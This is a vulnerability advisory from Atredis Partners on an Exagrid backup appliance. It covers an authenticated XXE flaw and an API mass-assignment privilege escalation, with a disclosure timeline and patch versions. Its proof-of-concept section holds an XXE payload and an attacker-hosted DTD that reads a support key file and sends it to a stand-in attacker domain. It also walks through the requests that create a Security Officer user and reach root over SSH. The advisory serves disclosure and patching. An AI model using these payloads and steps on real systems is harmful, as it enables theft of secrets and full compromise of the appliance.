# Exagrid: Multiple Vulnerabilities

## Vendor
- Exagrid

## Affected Products
- Exagrid EX10 7.0.1.P02

## Summary

Exagrid appliance is vulnerable to the following issues that could lead to privilege escalation or sensitive information disclosure.

* Authenticated XML External Entities Injection (CVE-2025-47184)
* Mass Assignment vulnerability in Exagrid APIs allowing privilege escalation (formerly CVE-2025-47185)

## Remediation/Mitigation

These issues were patched in Exagrid 6.4.0 P20, 7.0.1 P12, 7.2.0 P08. 

## Credit

These issues were found by Aditya Gujar of Atredis Partners.

## References

* https://www.exagrid.com/exagrid-products/exagrid-product-line/
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-47184     

## Report Timeline

* 2025-04-28: Atredis Partners sent an initial notification to vendor, including a draft advisory.
* 2025-04-28: Atredis Partners requested a CVE ID from MITRE CNA.
* 2025-05-01: MITRE assigned  CVE-2025-47184 and CVE-2025-47185 for the vulnerabilities.
* 2025-05-02: Atredis Partners notified the vendor of the CVE assignment.
* 2025-08-11: Atredis Partners informed the vendor of intention to disclose the issues and asked for a status update.
* 2025-08-11: Vendor confirmed the issues were patched in Exagrid version updates 6.4.0 P20, 7.0.1 P12 and 7.2.0 P08.
* 2025-08-13: Atredis Partners discovered that the vulnerability CVE-2025-47185 was independently discovered by another researcher and was assigned CVE-2025-29556. 
* 2025-08-14: Atredis Partners asks for a link to the release notes.
* 2025-08-15: Atredis Partners publishes advisory ATREDIS-2025-0004.


## Technical Details

### Authenticated XML External Entities Injection (CVE-2025-47184)

External DTD processing is not disabled in the Exagrid appliance which results in XML External Entities Injection attack. 
The vulnerability can be used to read sensitive system files through verbose error messages.

```http
POST /init HTTP/1.1
Host: 10.0.0.1
Cookie: [redacted]
Content-Type: text/plain; charset=UTF-8
Content-Length: 419
Connection: keep-alive

<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY % remote SYSTEM "https://<attacker-domain>/call.dtd"> %remote;]>
<IsysMessage>
   <header>
      <p2pVersion major="1" minor="0"/>
      <messageVersion major="1" minor="0"/>
   </header>
   <body>
      <action>ListAssets</action>
      <status>0</status>
      <parameters>
      </parameters>
   </body>
</IsysMessage>
```
**XXE Payload Injected**

With the following file hosted on attacker server:

```xml
<!ENTITY % payload SYSTEM "file:///isys/work/security/support.key">
<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'http://attacker-domain/%payload;'>">
%param1;
```
**`call.dtd` on Attacker Server**

The verbose errors from Exagrid server result in disclosure of system file contents.

```xml
<IsysMessage>
   <header>
      <p2pVersion major="1" minor="0" />
      <messageVersion major="1" minor="0" />
      <timeStamp rcvSecs="1744747957" retSecs="1744747957" />
   </header>
   <body>
      <action>commsResponse</action>
      <status>-1072496636</status>
      <parameters>
         <parameter>
            <detail>SERVLET: com.isys.ui.assets.InitServlet DETAIL: The format of the received message is incorrect. : createFromWireData: ERROR - XML FORMAT: Error on line 1 of document http://attacker-domain/[redacted]: The markup declarations contained or pointed to by the document type declaration must be well-formed.METHOD: doPost</detail>
         </parameter>
      </parameters>
   </body>
</IsysMessage>
```
**Verbose Error Discloses the File Contents**



### Mass Assignment vulnerability in Exagrid APIs allowing privilege escalation (formerly CVE-2025-47185)


The Security Officer role in Exagrid is responsible for handling security related settings of the appliance such as the Retention-Time-Lock (RTL), SSH keys, encryption etc.

As per Exagrid documentation, Administrators are restricted from creating new users with Security Officer role:

```
Note: With the introduction of ExaGrid Version 6.3, ExaGrid local users assigned the Admin role cannot create or modify ExaGrid local users assigned the Security Officer role and cannot accept or reject Security Requests.
```
**User Creation Restrictions**

It is possible for an Administrator to create a Security Officer user by manually setting the value of `group` parameter to `exagrid-sec-offs` role while creating a new user:

```http
POST /api/v1/sites/[redacted]/users HTTP/1.1
Host: 10.0.0.1
Cookie: [redacted]
Accept: application/json, text/plain, */*
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 187
Connection: keep-alive

{"name":"testsec","description":"testing","password":"[redacted]","enabled":true,"group":"exagrid-sec-offs","passwordChange":false,"siteUuid":"[redacted]"}
```
**HTTP Request to Create Security Officer User**

```http
HTTP/1.1 201 
Date: Wed, 09 Apr 2025 20:25:58 GMT
Server: ExaGrid
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: sameorigin
Cache-Control: max-age=600
X-UA-Compatible: IE=edge
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
```
**Successful User Creation**

The admin can then add a SSH key to the `root` user which would need approval from a Security Officer:

```http
POST /api/v1/sites/[redacted]/users/root/sshKeys HTTP/1.1
Host: 10.0.0.1
...snip...

{"key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu+[redacted]","enable":true}
```
**Adding SSH Key**

The SSH Key can then be approved using the Security Officer's credentials to gain SSH access to the appliance.

```bash
ssh -i exassh root@10.0.0.1

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 WARNING:
 Support functions are for ExaGrid Support Representatives only.
 Non-support personnel using support functions risk invalidating their
 system warranty and losing data.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Build: 7.0.1.P02 (official build 34.0.2.443 g5e13ada3deb exagridbuild@linuxbuild007)
Platform: 8.10.2024.1002-33.0.s103.4 on 010TSK23 (EX-AVTA244610581)
Server: EXAGRIDTEST [10.0.0.1]

Last login: Thu Apr  3 15:13:25 2025 from 10.0.0.2
Time: 20:27:46 up 6 days, 18:03, 3 users, load average: 0.04, 0.05, 0.00

[root@EXAGRIDTEST ~]# 

```
**Successful SSH Access**
